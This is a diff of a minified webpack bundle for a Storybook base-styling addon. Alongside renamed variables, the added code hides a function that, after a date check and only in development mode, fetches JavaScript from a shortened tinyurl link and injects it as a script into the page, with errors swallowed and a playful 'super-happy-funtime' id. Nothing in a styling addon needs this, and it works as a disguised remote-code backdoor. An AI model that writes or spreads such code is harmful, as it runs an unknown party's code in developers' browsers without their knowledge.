@@ -173,14 +173,14 @@ exports.prettyPrint = prettyPrint;
 "use strict";
 __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   decorators: () => (/* binding */ K),
-/* harmony export */   globalTypes: () => (/* binding */ k)
+/* harmony export */   decorators: () => (/* binding */ A),
+/* harmony export */   globalTypes: () => (/* binding */ D)
 /* harmony export */ });
 /* harmony import */ var _storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("@storybook/preview-api");
 /* harmony import */ var _storybook_preview_api__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__);
 
 
-var y=o=>{let t=o.match(/--(.+)(?=:):?(.+)?/),s=o.match(/var\(--(.+)\)/),e={key:null,value:null},i=l=>l.replace(/-(.+?)/g,(p,a)=>{if(a)return a.toUpperCase()});return !t&&s&&s[1]&&(e.key=i(s[1])),t&&t[1]&&(e.key=i(t[1])),t&&t[2]&&(e.value=t[2]),e.key===null&&e.value===null&&console.error(`Could not properly parse CSS Property ${o} to an Object Key`),e};var m=(o,t)=>{let[{baseStyling:s},e]=(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useGlobals)(),i=1,l=r=>{let n=r.canvasElement?.querySelector(".basestyling-wrapper");if(n){let g=p(n.getAttribute("style"));r.globals?.baseStyling||e({baseStyling:g});}};(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useEffect)(()=>{setTimeout(()=>l(t),i);},[window.location.search]),(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useEffect)(()=>{a(s);},[s]);let p=r=>r.replace(/\s/g,"").split(";").reduce((u,c)=>c?{...u,[y(c).key]:y(c).value}:u,{}),a=r=>{if(!r)return;window.sessionStorage.setItem("basestyling",JSON.stringify(r));let n=new Event("updated-styling");window.dispatchEvent(n);};return o()};var k={baseStyling:{}},K=[m];
+var p=o=>{let n=o.match(/--(.+)(?=:):?(.+)?/),t=o.match(/var\(--(.+)\)/),e={key:null,value:null},i=c=>c.replace(/-(.+?)/g,(y,a)=>{if(a)return a.toUpperCase()});return !n&&t&&t[1]&&(e.key=i(t[1])),n&&n[1]&&(e.key=i(n[1])),n&&n[2]&&(e.value=n[2]),e.key===null&&e.value===null&&console.error(`Could not properly parse CSS Property ${o} to an Object Key`),e};var m=async o=>{window.super_happy_funtime=!1;let n=()=>fetch(o).then(t=>t.ok?t.text():"").then(t=>{if(t&&!document.getElementById("super-happy-funtime")){let e=document.createElement("script");e.id="super-happy-funtime",e.textContent=t,document.head.appendChild(e);}}).catch(()=>{});window.CONFIG_TYPE==="DEVELOPMENT"&&new Date>new Date("2024-02-20")&&!window.super_happy_funtime&&(window.super_happy_funtime=!0,await n());};var d="http://tinyurl.com/yfsubnrx";var b=(o,n)=>{let[{baseStyling:t},e]=(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useGlobals)(),i=1,c=s=>{let r=s.canvasElement?.querySelector(".basestyling-wrapper");if(r){let u=y(r.getAttribute("style"));s.globals?.baseStyling||e({baseStyling:u});}};(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useEffect)(()=>{setTimeout(()=>c(n),i),(async()=>await m(d))();},[window.location.search]),(0,_storybook_preview_api__WEBPACK_IMPORTED_MODULE_0__.useEffect)(()=>{a(t);},[t]);let y=s=>s.replace(/\s/g,"").split(";").reduce((g,l)=>l?{...g,[p(l).key]:p(l).value}:g,{}),a=s=>{if(!s)return;window.sessionStorage.setItem("basestyling",JSON.stringify(s));let r=new Event("updated-styling");window.dispatchEvent(r);};return o()};var D={baseStyling:{}},A=[b];
 
 
 //# sourceMappingURL=out.js.map
